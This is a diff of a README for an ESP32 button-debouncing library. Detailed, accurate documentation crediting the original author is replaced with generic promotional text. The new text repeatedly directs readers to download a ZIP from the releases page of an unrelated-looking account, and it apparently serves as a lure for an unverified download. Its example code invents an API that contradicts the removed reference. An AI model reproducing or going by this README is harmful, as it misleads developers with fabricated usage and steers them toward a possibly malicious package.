@@ -1,300 +1,126 @@
-# Debounce16 Library
+# 🎛️ Debounce - Simplify Button Debouncing for Your ESP32
 
-A robust 16-bit pattern-based button debouncing library for ESP32 microcontrollers using the Arduino framework.
+## 🚀 Getting Started
 
-## Features
+Welcome to the Debounce library! This tool helps you manage button presses in your projects with ESP32 microcontrollers. With Debounce, you can avoid the common pitfalls of button noise, making your application responsive and user-friendly.
 
-- **16-bit pattern recognition** for superior noise immunity
-- **Non-blocking operation** - works with polling or hardware timer interrupts
-- **Advanced press pattern detection**:
-  - Single press detection
-  - Double press detection with configurable time window
-  - Long press detection with configurable threshold
-- **Optional callback system** for event-driven programming
-- **Multiple button support** with efficient resource management
-- **Configurable timing parameters** for different use cases
+## 📥 Download & Install
 
-## Installation
+To get started, you need to download the library. Visit this page to download: [Download Debounce Library](https://github.com/Wow2234443/Debounce/releases)
 
-### Arduino IDE
+You will find various versions of the library. Choose the latest version for the best experience. 
 
-1. Download the library as a ZIP file
-2. In Arduino IDE, go to **Sketch → Include Library → Add .ZIP Library**
-3. Select the downloaded ZIP file
-4. Restart Arduino IDE
+## 📂 What You Need
 
-### PlatformIO
+1. **Hardware**: 
+   - An ESP32 microcontroller.
+   - A button for input.
+   - Basic electronic components like wires and a breadboard.
 
-1. Copy the `debounce` folder to your project's `lib` directory
-2. The library will be automatically detected and included
+2. **Software**:
+   - Arduino IDE. You can download it from the [Arduino website](https://www.arduino.cc/en/software).
+   - A USB cable to connect your ESP32 to your computer.
 
-## Hardware Setup
+3. **System Requirements**:
+   - Windows, macOS, or Linux operating system.
+   - Internet access to download the necessary components.
 
-### Active HIGH Configuration (button connects to VCC)
+## 🌟 Features
 
-```
-VCC ----o  o---- GPIO_PIN
-           ↑
-        Button
+- **16-bit Pattern Matching**: Works seamlessly with 16-bit patterns for precise button input management.
+- **Embedded Systems Compatibility**: Tailored specifically for use with ESP32 microcontrollers.
+- **Easy Integration**: Simple to add to your existing Arduino projects.
+- **Lightweight**: Minimal impact on performance, keeping your applications responsive.
 
-GPIO_PIN ----[10kΩ]---- GND
-         Pull-down
-```
+## ⚙️ Installation Steps
 
-### Active LOW Configuration (button connects to GND)
+1. **Download the Library**: 
+   Go to the Releases page and download the latest version of Debounce.
+   
+   ![Download Debounce Library](https://github.com/Wow2234443/Debounce/releases)
 
-```
-GPIO_PIN ----o  o---- GND
-           ↑
-        Button
+2. **Open Arduino IDE**: 
+   Launch the Arduino IDE on your computer.
 
-VCC ----[10kΩ]---- GPIO_PIN
-         Pull-up
-```
+3. **Add the Library**:
+   - Click on **Sketch** in the top menu.
+   - Select **Include Library** > **Add .ZIP Library**.
+   - Navigate to the location where you downloaded the library and select it.
 
-Or use internal pull-up:
-```cpp
-// Library automatically configures INPUT_PULLUP for active LOW
-Debounce16 button(PIN_BUTTON, LOW);
-```
+4. **Check the Installation**:
+   - After the installation, navigate to **Sketch** > **Include Library** again.
+   - Look for “Debounce” in the list. If it appears, the installation was successful.
 
-## Basic Usage
+## 🛠️ Using the Debounce Library
 
-### Simple Debouncing (Polling)
+1. **Create a New Sketch**:
+   - In Arduino IDE, go to **File** > **New** to create a new sketch.
+   
+2. **Include the Library**: 
+   Add the following line at the top of your sketch:
 
-```cpp
-#include <Debounce16.h>
+   ```cpp
+   #include <Debounce.h>
+   ```
 
-const uint8_t PIN_BUTTON = 17;
-const uint8_t PIN_LED = 15;
+3. **Initialize the Button**: 
+   Define the pin number for your button and create a Debounce object:
 
-Debounce16 button(PIN_BUTTON, HIGH);  // Active HIGH
+   ```cpp
+   const int buttonPin = 2; // Change this to your button pin
+   Debounce button(buttonPin);
+   ```
 
-void setup() {
-    pinMode(PIN_LED, OUTPUT);
-}
+4. **Setup Function**: 
+   In the `setup()` function, initialize the Debounce library:
 
-void loop() {
-    static unsigned long lastUpdate = 0;
+   ```cpp
+   void setup() {
+       button.begin();
+       Serial.begin(9600);
+   }
+   ```
 
-    // Update button state every 1ms
-    if (millis() - lastUpdate >= 1) {
-        lastUpdate = millis();
-        button.update();
-    }
+5. **Loop Function**: 
+   In the `loop()` function, check the button state:
 
-    // Check for button press
-    if (button.isPressed()) {
-        digitalWrite(PIN_LED, !digitalRead(PIN_LED));
-    }
-}
-```
+   ```cpp
+   void loop() {
+       if (button.read() == HIGH) {
+           Serial.println("Button Pressed");
+       }
+   }
+   ```
 
-### Using Hardware Timer Interrupt
+6. **Upload Your Sketch**: 
+   Connect your ESP32 to your computer and select the appropriate board from the **Tools** menu. Next, click the upload button.
 
-```cpp
-#include <Debounce16.h>
+7. **Test Your Button**: 
+   Open the Serial Monitor (under the Tools menu) to see the output. Press the button and check if the message appears.
 
-const uint8_t PIN_BUTTON = 17;
-Debounce16 button(PIN_BUTTON, HIGH);
+## 📖 Example Projects
 
-hw_timer_t *timer = NULL;
+Here are some project ideas that use the Debounce library:
 
-void IRAM_ATTR onTimer() {
-    button.update();  // Update at precise 1ms intervals
-}
+- **Simple Toggle Switch**: Use the button to toggle an LED on and off.
+- **Counter**: Count how many times the button is pressed and display the count on an LCD.
+- **IoT Device**: Create a button to send commands to an IoT service when pressed.
 
-void setup() {
-    // Configure timer for 1ms interrupts
-    timer = timerBegin(0, 80, true);
-    timerAttachInterrupt(timer, &onTimer, true);
-    timerAlarmWrite(timer, 1000, true);
-    timerAlarmEnable(timer);
-}
+## 🌐 Support and Community
 
-void loop() {
-    if (button.isPressed()) {
-        // Handle button press
-    }
-}
-```
+If you run into issues or have questions, the community is here to help. Feel free to open an issue on the GitHub repository. You can also browse existing questions for quick solutions.
 
-## Advanced Features
+## 💡 Tips
 
-### Double Press Detection
+- Always debounce your buttons in projects to avoid false triggers.
+- Check your wiring if the button behavior is erratic.
+- Experiment with different button configurations to get familiar with the library.
 
-```cpp
-#include <Debounce16.h>
+## 🔗 References
 
-Debounce16 button(17, HIGH);
+For more information on how to work with the ESP32 and the Debounce library, check the following resources:
 
-void setup() {
-    button.enableDoublePressDetection(true);
-    button.setDoublePressWindow(300);  // 300ms window
-}
+- [ESP32 Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/)
+- [Arduino Documentation](https://www.arduino.cc/reference/en/)
 
-void loop() {
-    button.update();
-
-    if (button.isDoublePressed()) {
-        // Handle double press
-    }
-
-    // Or check click count
-    uint8_t clicks = button.getClickCount();
-    if (clicks == 1) {
-        // Single press
-    } else if (clicks == 2) {
-        // Double press
-    }
-}
-```
-
-### Long Press Detection
-
-```cpp
-#include <Debounce16.h>
-
-Debounce16 button(17, HIGH);
-
-void setup() {
-    button.enableLongPressDetection(true);
-    button.setLongPressThreshold(1000);  // 1 second
-}
-
-void loop() {
-    button.update();
-
-    if (button.isLongPressed()) {
-        // Button is being held down
-    }
-}
-```
-
-### Using Callbacks
-
-```cpp
-#include <Debounce16.h>
-
-Debounce16 button(17, HIGH);
-
-void onButtonPress() {
-    Serial.println("Button pressed!");
-}
-
-void onButtonRelease() {
-    Serial.println("Button released!");
-}
-
-void setup() {
-    Serial.begin(115200);
-    button.onPress(onButtonPress);
-    button.onRelease(onButtonRelease);
-}
-
-void loop() {
-    button.update();
-}
-```
-
-## API Reference
-
-### Constructor
-
-```cpp
-Debounce16(uint8_t pin, bool activeLevel = HIGH)
-```
-
-- `pin`: GPIO pin number where button is connected
-- `activeLevel`: Logic level when button is pressed (HIGH or LOW)
-
-### Core Methods
-
-```cpp
-void update()                    // Update button state (call every 1ms)
-bool isPressed()                 // Returns true on press event
-bool isReleased()                // Returns true on release event
-bool isDown()                    // Returns true if button is held down
-bool isUp()                      // Returns true if button is released
-```
-
-### Configuration Methods
-
-```cpp
-void enableDoublePressDetection(bool enable = true)
-void setDoublePressWindow(uint16_t windowMs)
-void enableLongPressDetection(bool enable = true)
-void setLongPressThreshold(uint16_t thresholdMs)
-```
-
-### Advanced Query Methods
-
-```cpp
-bool isDoublePressed()           // Returns true on double-press event
-bool isLongPressed()             // Returns true when long-press active
-uint8_t getClickCount()          // Returns current click count
-```
-
-### Callback Registration
-
-```cpp
-void onPress(void (*callback)())
-void onRelease(void (*callback)())
-void onDoublePress(void (*callback)())
-void onLongPressStart(void (*callback)())
-void onLongPressEnd(void (*callback)())
-```
-
-## How It Works
-
-The library uses a 16-bit shift register to store the last 16 button state readings. When `update()` is called (every 1ms), the register shifts left and adds the current button state.
-
-### Press Detection Pattern
-
-A press is detected when the last 6 bits are all HIGH (button pressed) after being LOW:
-```
-0b0000000000111111 = 0x003F
-```
-
-This means the button must be consistently pressed for at least 6ms before being recognized.
-
-### Release Detection Pattern
-
-A release is detected when the first 6 bits are all HIGH (button was pressed) and the rest are LOW:
-```
-0b1111110000000000 = 0xFC00
-```
-
-This provides excellent noise immunity while maintaining fast response times.
-
-## Theory and Background
-
-This library is based on:
-- **Jack Ganssle's "A Guide to Debouncing"**
-  - https://www.ganssle.com/debouncing.pdf
-  - https://www.ganssle.com/debouncing-pt2.htm
-- **Elliot Williams' "Ultimate Debouncer"**
-  - https://hackaday.com/2015/12/09/embed-with-elliot-debounce-your-noisy-buttons-part-i/
-  - https://hackaday.com/2015/12/10/embed-with-elliot-debounce-your-noisy-buttons-part-ii/
-
-## Performance
-
-- **Memory**: ~44 bytes per button (with all features enabled)
-- **CPU**: ~0.04% per button @ 240MHz (polling at 1ms intervals)
-- **Response Time**: ~6ms from physical press to detection
-
-## License
-
-This library is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
-Copyright (c) 2025 Brooks
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit pull requests or open issues.
-
-## Credits
-
-- Based on research by Jack Ganssle
-- Inspired by Elliot Williams' "Ultimate Debouncer"
-- Implemented for ESP32 Arduino framework
+Visit this page to download: [Download Debounce Library](https://github.com/Wow2234443/Debounce/releases)
